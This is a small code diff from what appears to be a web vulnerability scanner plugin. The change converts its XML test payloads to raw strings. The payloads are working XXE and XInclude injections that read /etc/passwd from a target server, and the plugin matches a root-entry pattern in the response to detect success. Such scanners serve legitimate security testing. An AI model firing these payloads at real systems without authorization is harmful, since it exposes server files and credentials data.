@@ -21,10 +21,10 @@ class Z0SCAN(PluginBase):
             if self.requests.post_hint == POST_HINT.XML:
                 payloads = [
                     (
-                    '''<?xml version="1.0"?><!DOCTYPE ANY [<!ENTITY content SYSTEM "file:///etc/passwd">]><a>&content;</a>''',
+                    r'''<?xml version="1.0"?><!DOCTYPE ANY [<!ENTITY content SYSTEM "file:///etc/passwd">]><a>&content;</a>''',
                     b"root:[x*]:0:0:"),
                     (
-                    '''<?xml version="1.0" ?><root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd" parse="text"/></root>''',
+                    r'''<?xml version="1.0" ?><root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd" parse="text"/></root>''',
                     b"root:[x*]:0:0:")
                 ]
                 url = self.requests.url
@@ -54,8 +54,8 @@ class Z0SCAN(PluginBase):
                         break
             elif self.requests.params or self.requests.post_hint == POST_HINT.NORMAL or self.requests.post_hint == POST_HINT.ARRAY_LIKE:
                 payloads=[
-                    ('''<?xml version="1.0"?><!DOCTYPE ANY [<!ENTITY content SYSTEM "file:///etc/passwd">]><a>&content;</a>''',b"root:[x\*]:0:0:"),
-                    ('''<?xml version="1.0" ?><root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd" parse="text"/></root>''',b"root:[x\*]:0:0:")
+                    (r'''<?xml version="1.0"?><!DOCTYPE ANY [<!ENTITY content SYSTEM "file:///etc/passwd">]><a>&content;</a>''',b"root:[x\*]:0:0:"),
+                    (r'''<?xml version="1.0" ?><root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd" parse="text"/></root>''',b"root:[x\*]:0:0:")
                     ]
                 iterdatas = self.generateItemdatas()
                 test_args = []
